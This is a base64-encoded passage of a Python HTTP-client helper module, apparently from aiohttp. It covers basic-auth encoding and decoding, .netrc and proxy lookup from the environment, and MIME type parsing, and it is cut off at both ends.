YXJzZWRhdGVcclxuZnJvbSBtYXRoIGltcG9ydCBjZWlsXHJcbmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aFxyXG5mcm9tIHR5cGVzIGltcG9ydCBUcmFjZWJhY2tUeXBlXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoXHJcbiAgICBBbnksXHJcbiAgICBDYWxsYWJsZSxcclxuICAgIENvbnRleHRNYW5hZ2VyLFxyXG4gICAgRGljdCxcclxuICAgIEdlbmVyYXRvcixcclxuICAgIEdlbmVyaWMsXHJcbiAgICBJdGVyYWJsZSxcclxuICAgIEl0ZXJhdG9yLFxyXG4gICAgTGlzdCxcclxuICAgIE1hcHBpbmcsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFBhdHRlcm4sXHJcbiAgICBTZXQsXHJcbiAgICBUdXBsZSxcclxuICAgIFR5cGUsXHJcbiAgICBUeXBlVmFyLFxyXG4gICAgVW5pb24sXHJcbiAgICBjYXN0LFxyXG4pXHJcbmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCBxdW90ZVxyXG5mcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBnZXRwcm94aWVzLCBwcm94eV9ieXBhc3NcclxuXHJcbmltcG9ydCBhc3luY190aW1lb3V0XHJcbmltcG9ydCBhdHRyXHJcbmZyb20gbXVsdGlkaWN0IGltcG9ydCBNdWx0aURpY3QsIE11bHRpRGljdFByb3h5XHJcbmZyb20geWFybCBpbXBvcnQgVVJMXHJcblxyXG5mcm9tIC4gaW1wb3J0IGhkcnNcclxuZnJvbSAubG9nIGltcG9ydCBjbGllbnRfbG9nZ2VyLCBpbnRlcm5hbF9sb2dnZXJcclxuZnJvbSAudHlwZWRlZnMgaW1wb3J0IFBhdGhMaWtlLCBQcm90b2NvbCAgIyBub3FhXHJcblxyXG5fX2FsbF9fID0gKCJCYXNpY0F1dGgiLCAiQ2hhaW5NYXBQcm94eSIsICJFVGFnIilcclxuXHJcbklTX01BQ09TID0gcGxhdGZvcm0uc3lzdGVtKCkgPT0gIkRhcndpbiJcclxuSVNfV0lORE9XUyA9IHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIlxyXG5cclxuUFlfMzYgPSBzeXMudmVyc2lvbl9pbmZvID49ICgzLCA2KVxyXG5QWV8zNyA9IHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDcpXHJcblBZXzM4ID0gc3lzLnZlcnNpb25faW5mbyA+PSAoMywgOClcclxuUFlfMzEwID0gc3lzLnZlcnNpb25faW5mbyA+PSAoMywgMTApXHJcblxyXG5pZiBzeXMudmVyc2lvbl9pbmZvIDwgKDMsIDcpOlxyXG4gICAgaW1wb3J0IGlkbmFfc3NsXHJcblxyXG4gICAgaWRuYV9zc2wucGF0Y2hfbWF0Y2hfaG9zdG5hbWUoKVxyXG5cclxuICAgIGRlZiBhbGxfdGFza3MoXHJcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxyXG4gICAgKSAtPiBTZXRbImFzeW5jaW8uVGFza1tBbnldIl06XHJcbiAgICAgICAgdGFza3MgPSBsaXN0KGFzeW5jaW8uVGFzay5hbGxfdGFza3MobG9vcCkpXHJcbiAgICAgICAgcmV0dXJuIHt0IGZvciB0IGluIHRhc2tzIGlmIG5vdCB0LmRvbmUoKX1cclxuXHJcblxyXG5lbHNlOlxyXG4gICAgYWxsX3Rhc2tzID0gYXN5bmNpby5hbGxfdGFza3NcclxuXHJcblxyXG5fVCA9IFR5cGVWYXIoIl9UIilcclxuX1MgPSBUeXBlVmFyKCJfUyIpXHJcblxyXG5cclxuc2VudGluZWwgPSBvYmplY3QoKSAgIyB0eXBlOiBBbnlcclxuTk9fRVhURU5TSU9OUyA9IGJvb2wob3MuZW52aXJvbi5nZXQoIkFJT0hUVFBfTk9fRVhURU5TSU9OUyIpKSAgIyB0eXBlOiBib29sXHJcblxyXG4jIE4uQi4gc3lzLmZsYWdzLmRldl9tb2RlIGlzIGF2YWlsYWJsZSBvbiBQeXRob24gMy43KywgdXNlIGdldGF0dHJcclxuIyBmb3IgY29tcGF0aWJpbGl0eSB3aXRoIG9sZGVyIHZlcnNpb25zXHJcbkRFQlVHID0gZ2V0YXR0cihzeXMuZmxhZ3MsICJkZXZfbW9kZSIsIEZhbHNlKSBvciAoXHJcbiAgICBub3Qgc3lzLmZsYWdzLmlnbm9yZV9lbnZpcm9ubWVudCBhbmQgYm9vbChvcy5lbnZpcm9uLmdldCgiUFlUSE9OQVNZTkNJT0RFQlVHIikpXHJcbikgICMgdHlwZTogYm9vbFxyXG5cclxuXHJcbkNIQVIgPSB7Y2hyKGkpIGZvciBpIGluIHJhbmdlKDAsIDEyOCl9XHJcbkNUTCA9IHtjaHIoaSkgZm9yIGkgaW4gcmFuZ2UoMCwgMzIpfSB8IHtcclxuICAgIGNocigxMjcpLFxyXG59XHJcblNFUEFSQVRPUlMgPSB7XHJcbiAgICAiKCIsXHJcbiAgICAiKSIsXHJcbiAgICAiPCIsXHJcbiAgICAiPiIsXHJcbiAgICAiQCIsXHJcbiAgICAiLCIsXHJcbiAgICAiOyIsXHJcbiAgICAiOiIsXHJcbiAgICAiXFxcXCIsXHJcbiAgICBcJyJcJyxcclxuICAgICIvIixcclxuICAgICJbIixcclxuICAgICJdIixcclxuICAgICI/IixcclxuICAgICI9IixcclxuICAgICJ7IixcclxuICAgICJ9IixcclxuICAgICIgIixcclxuICAgIGNocig5KSxcclxufVxyXG5UT0tFTiA9IENIQVIgXiBDVEwgXiBTRVBBUkFUT1JTXHJcblxyXG5cclxuY2xhc3Mgbm9vcDpcclxuICAgIGRlZiBfX2F3YWl0X18oc2VsZikgLT4gR2VuZXJhdG9yW05vbmUsIE5vbmUsIE5vbmVdOlxyXG4gICAgICAgIHlpZWxkXHJcblxyXG5cclxuY2xhc3MgQmFzaWNBdXRoKG5hbWVkdHVwbGUoIkJhc2ljQXV0aCIsIFsibG9naW4iLCAicGFzc3dvcmQiLCAiZW5jb2RpbmciXSkpOlxyXG4gICAgIiIiSHR0cCBiYXNpYyBhdXRoZW50aWNhdGlvbiBoZWxwZXIuIiIiXHJcblxyXG4gICAgZGVmIF9fbmV3X18oXHJcbiAgICAgICAgY2xzLCBsb2dpbjogc3RyLCBwYXNzd29yZDogc3RyID0gIiIsIGVuY29kaW5nOiBzdHIgPSAibGF0aW4xIlxyXG4gICAgKSAtPiAiQmFzaWNBdXRoIjpcclxuICAgICAgICBpZiBsb2dpbiBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJOb25lIGlzIG5vdCBhbGxvd2VkIGFzIGxvZ2luIHZhbHVlIilcclxuXHJcbiAgICAgICAgaWYgcGFzc3dvcmQgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm9uZSBpcyBub3QgYWxsb3dlZCBhcyBwYXNzd29yZCB2YWx1ZSIpXHJcblxyXG4gICAgICAgIGlmICI6IiBpbiBsb2dpbjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcJ0EgIjoiIGlzIG5vdCBhbGxvd2VkIGluIGxvZ2luIChSRkMgMTk0NSNzZWN0aW9uLTExLjEpXCcpXHJcblxyXG4gICAgICAgIHJldHVybiBzdXBlcigpLl9fbmV3X18oY2xzLCBsb2dpbiwgcGFzc3dvcmQsIGVuY29kaW5nKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIGRlY29kZShjbHMsIGF1dGhfaGVhZGVyOiBzdHIsIGVuY29kaW5nOiBzdHIgPSAibGF0aW4xIikgLT4gIkJhc2ljQXV0aCI6XHJcbiAgICAgICAgIiIiQ3JlYXRlIGEgQmFzaWNBdXRoIG9iamVjdCBmcm9tIGFuIEF1dGhvcml6YXRpb24gSFRUUCBoZWFkZXIuIiIiXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBhdXRoX3R5cGUsIGVuY29kZWRfY3JlZGVudGlhbHMgPSBhdXRoX2hlYWRlci5zcGxpdCgiICIsIDEpXHJcbiAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNvdWxkIG5vdCBwYXJzZSBhdXRob3JpemF0aW9uIGhlYWRlci4iKVxyXG5cclxuICAgICAgICBpZiBhdXRoX3R5cGUubG93ZXIoKSAhPSAiYmFzaWMiOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJVbmtub3duIGF1dGhvcml6YXRpb24gbWV0aG9kICVzIiAlIGF1dGhfdHlwZSlcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBkZWNvZGVkID0gYmFzZTY0LmI2NGRlY29kZShcclxuICAgICAgICAgICAgICAgIGVuY29kZWRfY3JlZGVudGlhbHMuZW5jb2RlKCJhc2NpaSIpLCB2YWxpZGF0ZT1UcnVlXHJcbiAgICAgICAgICAgICkuZGVjb2RlKGVuY29kaW5nKVxyXG4gICAgICAgIGV4Y2VwdCBiaW5hc2NpaS5FcnJvcjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiSW52YWxpZCBiYXNlNjQgZW5jb2RpbmcuIilcclxuXHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAjIFJGQyAyNjE3IEhUVFAgQXV0aGVudGljYXRpb25cclxuICAgICAgICAgICAgIyBodHRwczovL3d3dy5pZXRmLm9yZy9yZmMvcmZjMjYxNy50eHRcclxuICAgICAgICAgICAgIyB0aGUgY29sb24gbXVzdCBiZSBwcmVzZW50LCBidXQgdGhlIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBtYXkgYmVcclxuICAgICAgICAgICAgIyBvdGhlcndpc2UgYmxhbmsuXHJcbiAgICAgICAgICAgIHVzZXJuYW1lLCBwYXNzd29yZCA9IGRlY29kZWQuc3BsaXQoIjoiLCAxKVxyXG4gICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIGNyZWRlbnRpYWxzLiIpXHJcblxyXG4gICAgICAgIHJldHVybiBjbHModXNlcm5hbWUsIHBhc3N3b3JkLCBlbmNvZGluZz1lbmNvZGluZylcclxuXHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBmcm9tX3VybChjbHMsIHVybDogVVJMLCAqLCBlbmNvZGluZzogc3RyID0gImxhdGluMSIpIC0+IE9wdGlvbmFsWyJCYXNpY0F1dGgiXTpcclxuICAgICAgICAiIiJDcmVhdGUgQmFzaWNBdXRoIGZyb20gdXJsLiIiIlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHVybCwgVVJMKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJ1cmwgc2hvdWxkIGJlIHlhcmwuVVJMIGluc3RhbmNlIilcclxuICAgICAgICBpZiB1cmwudXNlciBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIHJldHVybiBjbHModXJsLnVzZXIsIHVybC5wYXNzd29yZCBvciAiIiwgZW5jb2Rpbmc9ZW5jb2RpbmcpXHJcblxyXG4gICAgZGVmIGVuY29kZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiRW5jb2RlIGNyZWRlbnRpYWxzLiIiIlxyXG4gICAgICAgIGNyZWRzID0gKGYie3NlbGYubG9naW59OntzZWxmLnBhc3N3b3JkfSIpLmVuY29kZShzZWxmLmVuY29kaW5nKVxyXG4gICAgICAgIHJldHVybiAiQmFzaWMgJXMiICUgYmFzZTY0LmI2NGVuY29kZShjcmVkcykuZGVjb2RlKHNlbGYuZW5jb2RpbmcpXHJcblxyXG5cclxuZGVmIHN0cmlwX2F1dGhfZnJvbV91cmwodXJsOiBVUkwpIC0+IFR1cGxlW1VSTCwgT3B0aW9uYWxbQmFzaWNBdXRoXV06XHJcbiAgICBhdXRoID0gQmFzaWNBdXRoLmZyb21fdXJsKHVybClcclxuICAgIGlmIGF1dGggaXMgTm9uZTpcclxuICAgICAgICByZXR1cm4gdXJsLCBOb25lXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJldHVybiB1cmwud2l0aF91c2VyKE5vbmUpLCBhdXRoXHJcblxyXG5cclxuZGVmIG5ldHJjX2Zyb21fZW52KCkgLT4gT3B0aW9uYWxbbmV0cmMubmV0cmNdOlxyXG4gICAgIiIiTG9hZCBuZXRyYyBmcm9tIGZpbGUuXHJcblxyXG4gICAgQXR0ZW1wdCB0byBsb2FkIGl0IGZyb20gdGhlIHBhdGggc3BlY2lmaWVkIGJ5IHRoZSBlbnYtdmFyXHJcbiAgICBORVRSQyBvciBpbiB0aGUgZGVmYXVsdCBsb2NhdGlvbiBpbiB0aGUgdXNlclwncyBob21lIGRpcmVjdG9yeS5cclxuXHJcbiAgICBSZXR1cm5zIE5vbmUgaWYgaXQgY291bGRuXCd0IGJlIGZvdW5kIG9yIGZhaWxzIHRvIHBhcnNlLlxyXG4gICAgIiIiXHJcbiAgICBuZXRyY19lbnYgPSBvcy5lbnZpcm9uLmdldCgiTkVUUkMiKVxyXG5cclxuICAgIGlmIG5ldHJjX2VudiBpcyBub3QgTm9uZTpcclxuICAgICAgICBuZXRyY19wYXRoID0gUGF0aChuZXRyY19lbnYpXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaG9tZV9kaXIgPSBQYXRoLmhvbWUoKVxyXG4gICAgICAgIGV4Y2VwdCBSdW50aW1lRXJyb3IgYXMgZTogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICAjIGlmIHBhdGhsaWIgY2FuXCd0IHJlc29sdmUgaG9tZSwgaXQgbWF5IHJhaXNlIGEgUnVudGltZUVycm9yXHJcbiAgICAgICAgICAgIGNsaWVudF9sb2dnZXIuZGVidWcoXHJcbiAgICAgICAgICAgICAgICAiQ291bGQgbm90IHJlc29sdmUgaG9tZSBkaXJlY3Rvcnkgd2hlbiAiXHJcbiAgICAgICAgICAgICAgICAidHJ5aW5nIHRvIGxvb2sgZm9yIC5uZXRyYyBmaWxlOiAlcyIsXHJcbiAgICAgICAgICAgICAgICBlLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgICAgIG5ldHJjX3BhdGggPSBob21lX2RpciAvICgiX25ldHJjIiBpZiBJU19XSU5ET1dTIGVsc2UgIi5uZXRyYyIpXHJcblxyXG4gICAgdHJ5OlxyXG4gICAgICAgIHJldHVybiBuZXRyYy5uZXRyYyhzdHIobmV0cmNfcGF0aCkpXHJcbiAgICBleGNlcHQgbmV0cmMuTmV0cmNQYXJzZUVycm9yIGFzIGU6XHJcbiAgICAgICAgY2xpZW50X2xvZ2dlci53YXJuaW5nKCJDb3VsZCBub3QgcGFyc2UgLm5ldHJjIGZpbGU6ICVzIiwgZSlcclxuICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6XHJcbiAgICAgICAgIyB3ZSBjb3VsZG5cJ3QgcmVhZCB0aGUgZmlsZSAoZG9lc25cJ3QgZXhpc3QsIHBlcm1pc3Npb25zLCBldGMuKVxyXG4gICAgICAgIGlmIG5ldHJjX2VudiBvciBuZXRyY19wYXRoLmlzX2ZpbGUoKTpcclxuICAgICAgICAgICAgIyBvbmx5IHdhcm4gaWYgdGhlIGVudmlyb25tZW50IHdhbnRlZCB1cyB0byBsb2FkIGl0LFxyXG4gICAgICAgICAgICAjIG9yIGl0IGFwcGVhcnMgbGlrZSB0aGUgZGVmYXVsdCBmaWxlIGRvZXMgYWN0dWFsbHkgZXhpc3RcclxuICAgICAgICAgICAgY2xpZW50X2xvZ2dlci53YXJuaW5nKCJDb3VsZCBub3QgcmVhZCAubmV0cmMgZmlsZTogJXMiLCBlKVxyXG5cclxuICAgIHJldHVybiBOb25lXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXHJcbmNsYXNzIFByb3h5SW5mbzpcclxuICAgIHByb3h5OiBVUkxcclxuICAgIHByb3h5X2F1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF1cclxuXHJcblxyXG5kZWYgcHJveGllc19mcm9tX2VudigpIC0+IERpY3Rbc3RyLCBQcm94eUluZm9dOlxyXG4gICAgcHJveHlfdXJscyA9IHtcclxuICAgICAgICBrOiBVUkwodilcclxuICAgICAgICBmb3IgaywgdiBpbiBnZXRwcm94aWVzKCkuaXRlbXMoKVxyXG4gICAgICAgIGlmIGsgaW4gKCJodHRwIiwgImh0dHBzIiwgIndzIiwgIndzcyIpXHJcbiAgICB9XHJcbiAgICBuZXRyY19vYmogPSBuZXRyY19mcm9tX2VudigpXHJcbiAgICBzdHJpcHBlZCA9IHtrOiBzdHJpcF9hdXRoX2Zyb21fdXJsKHYpIGZvciBrLCB2IGluIHByb3h5X3VybHMuaXRlbXMoKX1cclxuICAgIHJldCA9IHt9XHJcbiAgICBmb3IgcHJvdG8sIHZhbCBpbiBzdHJpcHBlZC5pdGVtcygpOlxyXG4gICAgICAgIHByb3h5LCBhdXRoID0gdmFsXHJcbiAgICAgICAgaWYgcHJveHkuc2NoZW1lIGluICgiaHR0cHMiLCAid3NzIik6XHJcbiAgICAgICAgICAgIGNsaWVudF9sb2dnZXIud2FybmluZyhcclxuICAgICAgICAgICAgICAgICIlcyBwcm94aWVzICVzIGFyZSBub3Qgc3VwcG9ydGVkLCBpZ25vcmluZyIsIHByb3h5LnNjaGVtZS51cHBlcigpLCBwcm94eVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgaWYgbmV0cmNfb2JqIGFuZCBhdXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGF1dGhfZnJvbV9uZXRyYyA9IE5vbmVcclxuICAgICAgICAgICAgaWYgcHJveHkuaG9zdCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIGF1dGhfZnJvbV9uZXRyYyA9IG5ldHJjX29iai5hdXRoZW50aWNhdG9ycyhwcm94eS5ob3N0KVxyXG4gICAgICAgICAgICBpZiBhdXRoX2Zyb21fbmV0cmMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAjIGF1dGhfZnJvbV9uZXRyYyBpcyBhIChgdXNlcmAsIGBhY2NvdW50YCwgYHBhc3N3b3JkYCkgdHVwbGUsXHJcbiAgICAgICAgICAgICAgICAjIGB1c2VyYCBhbmQgYGFjY291bnRgIGJvdGggY2FuIGJlIHVzZXJuYW1lLFxyXG4gICAgICAgICAgICAgICAgIyBpZiBgdXNlcmAgaXMgTm9uZSwgdXNlIGBhY2NvdW50YFxyXG4gICAgICAgICAgICAgICAgKmxvZ2lucywgcGFzc3dvcmQgPSBhdXRoX2Zyb21fbmV0cmNcclxuICAgICAgICAgICAgICAgIGxvZ2luID0gbG9naW5zWzBdIGlmIGxvZ2luc1swXSBlbHNlIGxvZ2luc1stMV1cclxuICAgICAgICAgICAgICAgIGF1dGggPSBCYXNpY0F1dGgoY2FzdChzdHIsIGxvZ2luKSwgY2FzdChzdHIsIHBhc3N3b3JkKSlcclxuICAgICAgICByZXRbcHJvdG9dID0gUHJveHlJbmZvKHByb3h5LCBhdXRoKVxyXG4gICAgcmV0dXJuIHJldFxyXG5cclxuXHJcbmRlZiBjdXJyZW50X3Rhc2soXHJcbiAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbikgLT4gIk9wdGlvbmFsW2FzeW5jaW8uVGFza1tBbnldXSI6XHJcbiAgICBpZiBzeXMudmVyc2lvbl9pbmZvID49ICgzLCA3KTpcclxuICAgICAgICByZXR1cm4gYXN5bmNpby5jdXJyZW50X3Rhc2sobG9vcD1sb29wKVxyXG4gICAgZWxzZTpcclxuICAgICAgICByZXR1cm4gYXN5bmNpby5UYXNrLmN1cnJlbnRfdGFzayhsb29wPWxvb3ApXHJcblxyXG5cclxuZGVmIGdldF9ydW5uaW5nX2xvb3AoXHJcbiAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbikgLT4gYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcDpcclxuICAgIGlmIGxvb3AgaXMgTm9uZTpcclxuICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcbiAgICBpZiBub3QgbG9vcC5pc19ydW5uaW5nKCk6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgIlRoZSBvYmplY3Qgc2hvdWxkIGJlIGNyZWF0ZWQgd2l0aGluIGFuIGFzeW5jIGZ1bmN0aW9uIixcclxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICBzdGFja2xldmVsPTMsXHJcbiAgICAgICAgKVxyXG4gICAgICAgIGlmIGxvb3AuZ2V0X2RlYnVnKCk6XHJcbiAgICAgICAgICAgIGludGVybmFsX2xvZ2dlci53YXJuaW5nKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBvYmplY3Qgc2hvdWxkIGJlIGNyZWF0ZWQgd2l0aGluIGFuIGFzeW5jIGZ1bmN0aW9uIiwgc3RhY2tfaW5mbz1UcnVlXHJcbiAgICAgICAgICAgIClcclxuICAgIHJldHVybiBsb29wXHJcblxyXG5cclxuZGVmIGlzYXN5bmNnZW5mdW5jdGlvbihvYmo6IEFueSkgLT4gYm9vbDpcclxuICAgIGZ1bmMgPSBnZXRhdHRyKGluc3BlY3QsICJpc2FzeW5jZ2VuZnVuY3Rpb24iLCBOb25lKVxyXG4gICAgaWYgZnVuYyBpcyBub3QgTm9uZTpcclxuICAgICAgICByZXR1cm4gZnVuYyhvYmopICAjIHR5cGU6IGlnbm9yZVtuby1hbnktcmV0dXJuXVxyXG4gICAgZWxzZTpcclxuICAgICAgICByZXR1cm4gRmFsc2VcclxuXHJcblxyXG5kZWYgZ2V0X2Vudl9wcm94eV9mb3JfdXJsKHVybDogVVJMKSAtPiBUdXBsZVtVUkwsIE9wdGlvbmFsW0Jhc2ljQXV0aF1dOlxyXG4gICAgIiIiR2V0IGEgcGVybWl0dGVkIHByb3h5IGZvciB0aGUgZ2l2ZW4gVVJMIGZyb20gdGhlIGVudi4iIiJcclxuICAgIGlmIHVybC5ob3N0IGlzIG5vdCBOb25lIGFuZCBwcm94eV9ieXBhc3ModXJsLmhvc3QpOlxyXG4gICAgICAgIHJhaXNlIExvb2t1cEVycm9yKGYiUHJveHlpbmcgaXMgZGlzYWxsb3dlZCBmb3IgYHt1cmwuaG9zdCFyfWAiKVxyXG5cclxuICAgIHByb3hpZXNfaW5fZW52ID0gcHJveGllc19mcm9tX2VudigpXHJcbiAgICB0cnk6XHJcbiAgICAgICAgcHJveHlfaW5mbyA9IHByb3hpZXNfaW5fZW52W3VybC5zY2hlbWVdXHJcbiAgICBleGNlcHQgS2V5RXJyb3I6XHJcbiAgICAgICAgcmFpc2UgTG9va3VwRXJyb3IoZiJObyBwcm94aWVzIGZvdW5kIGZvciBge3VybCFzfWAgaW4gdGhlIGVudiIpXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJldHVybiBwcm94eV9pbmZvLnByb3h5LCBwcm94eV9pbmZvLnByb3h5X2F1dGhcclxuXHJcblxyXG5AYXR0ci5zKGF1dG9fYXR0cmlicz1UcnVlLCBmcm96ZW49VHJ1ZSwgc2xvdHM9VHJ1ZSlcclxuY2xhc3MgTWltZVR5cGU6XHJcbiAgICB0eXBlOiBzdHJcclxuICAgIHN1YnR5cGU6IHN0clxyXG4gICAgc3VmZml4OiBzdHJcclxuICAgIHBhcmFtZXRlcnM6ICJNdWx0aURpY3RQcm94eVtzdHJdIlxyXG5cclxuXHJcbkBmdW5jdG9vbHMubHJ1X2NhY2hlKG1heHNpemU9NTYpXHJcbmRlZiBwYXJzZV9taW1ldHlwZShtaW1ldHlwZTogc3RyKSAtPiBNaW1lVHlwZTpcclxuICAgICIiIlBhcnNlcyBhIE1JTUUgdHlwZSBpbnRvIGl0cyBjb21wb25lbnRzLlxyXG5cclxuICAgIG1pbWV0eXBlIGlzIGEgTUlNRSB0eXBlIHN0cmluZy5cclxuXHJcbiAgICBSZXR1cm5zIGEgTWltZVR5cGUgb2JqZWN0LlxyXG5cclxuICAgIEV4YW1wbGU6XHJcblxyXG4gICAgPj4+IHBhcnNlX21pbWV0eXBlKFwndGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04XCcpXHJcbiAgICBNaW1lVHlwZSh0eXBlPVwndGV4dFwnLCBzdWJ0eXBlPVwnaHRtbFwnLCBzdWZmaXg9XCdcJyxcclxuICAgICAgICAgICAgIHBhcmFtZXRlcnM9e1wnY2hhcnNldFwnOiBcJ3V0Zi04XCd9KVxyXG5cclxuICAgICIiIlxyXG4gICAgaWYgbm90IG1pbWV0eXBlOlxyXG4gICAgICAgIHJldHVybiBNaW1lVHlwZShcclxuICAgICAgICAgICAgdHlwZT0iIiwgc3VidHlwZT0iIiwgc3VmZml4PSIiLCBwYXJhbWV0ZXJzPU11bHRpRGljdFByb3h5KE11bHRpRGljdCgpKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBwYXJ0cyA9IG1pbWV0eXBlLnNwbGl0KCI7IilcclxuICAgIHBhcmFtcyA9IE11bHRpRGljdCgpICAjIHR5cGU6IE11bHRpRGljdFtzdHJdXHJcbiAgICBmb3IgaXRlbSBpbiBwYXJ0c1sxOl06XHJcbiAgICAgICAgaWYgbm90IGl0ZW06XHJcbiAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAga2V5LCB2YWx1ZSA9IGNhc3QoXHJcbiAgICAgICAgICAgIFR1cGxlW3N0ciwgc3RyXSwgaXRlbS5zcGxpdCgiPSIsIDEpIGlmICI9IiBpbiBpdGVtIGVsc2UgKGl0ZW0sICIiKVxyXG4gICAgICAgIClcclxuICAgICAgICBwYXJhbXMuYWRkKGtleS5sb3dlcigpLnN0cmlwKCksIHZhbHVlLnN0cmlwKFwnICJcJykpXHJcblxyXG4gICAgZnVsbHR5cGUgPSBwYXJ0c1swXS5zdHJpcCgpLmxvd2VyKClcclxuICAgIGlmIGZ1bGx0eXBlID09ICIqIjpcclxuICAgICAgICBmdWxsdHlwZSA9ICIqLyoiXHJcblxyXG4gICAgbXR5cGUsIHN0eXBlID0gKFxyXG4gICAgICAgIGNhc3QoVHVwbGVbc3RyLCBzdHJdLCBmdWxsdHlwZS5zcGxpdCgiLyIsIDEpKVxyXG4gICAgICAgIGlmICIvIiBpbiBmdWxsdHlwZVxyXG4gICAgICAgIGVsc2UgKGZ1bGx0eXBlLCAiIilcclxuICAgIClcclxuICAgIHN0eXBlLCBzdWZmaXggPSAoXHJcbiAgICAgICAgY2FzdChUdXBsZVtzdHIsIHN0cl0sIHN0eXBlLnNwbGl0KCIrIiwgMSkpIGlmICIrIiBpbiBzdHlwZSBlbHNlIChzdHlwZSwgIiIpXHJcbiAgICApXHJcblxyXG4gICAgcmV0dXJuIE1pbWVUeXBlKFxyXG4gICAgICAgIHR5cGU9bXR5cGUsIHN1YnR5cGU9c3R5cGUsIHN1ZmZpeD1zdWZmaXgsIHBhcmFtZXRlcnM9TXVsdGlEaWN0UHJveHkocGFyYW1zKVxyXG4gICAgKVxyXG5cclxuXHJcbmRlZiBndWVzc19maWxlbmFtZShvYmo6IEFueSwgZGVmYXVsdDogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IE9wdGlvbmFsW3N0cl06XHJcbiAgICBuYW1lID0gZ2V0YXR0cihvYmosICJuYW1lIiwgTm9uZSlcclxuICAgIGlmIG5hbWUgYW5kIGlzaW5zdGFuY2UobmFtZSwgc3RyKSBhbmQgbmFtZVswXSAhPSAiPCIgYW5kIG5hbWVbLTFdICE9ICI+IjpcclxuICAgICAgICByZXR1cm4gUGF0aChuYW1lKS5uYW1lXHJcbiAgICByZXR1cm4gZGVmYXVsdFxyXG5cclxuXHJcbm5vdF9xdGV4dF9yZSA9IHJlLmNvbXBpbGUociJbXlxcMDQxXFwwNDMtXFwxMzNcXDEzNS1cXDE3Nl0iKVxyXG5RQ09OVEVOVCA9IHtjaHIoaSkgZm9yIGkgaW4gcmFuZ2UoMHgyMCwgMHg3Ril9IHwgeyJcXHQifVxyXG5cclxuXHJcbmRlZiBxdW90ZWRfc3RyaW5nKGNvbnRlbnQ6IHN0cikgLT4gc3RyOlxyXG4gICAgIiIiUmV0dXJuIDctYml0IGNvbnRlbnQgYXMgcXVvdGVkLXN0cmluZy5cclxuXHJcbiAgICBGb3JtYXQgY29udGVudCBpbnRvIGEgcXVvdGVkLXN0cmluZyBhcyBkZWZpbmVkIGluIFJGQzUzMjIgZm9yXHJcbiAgICBJbnRlcm5ldCBNZXNzYWdlIEZvcm1hdC4gTm90aWNlIHRoYXQgdGhpcyBpcyBub3QgdGhlIDgtYml0IEhUVFBcclxuICAgIGZvcm1hdCwgYnV0IHRoZSA3LWJpdCBlbWFpbCBmb3JtYXQuIENvbnRlbnQgbXVzdCBiZSBpbiB1c2FzY2lpIG9yXHJcbiAgICBhIFZhbHVlRXJyb3IgaXMgcmFpc2VkLlxyXG4gICAgIiIiXHJcbiAgICBpZiBub3QgKFFDT05URU5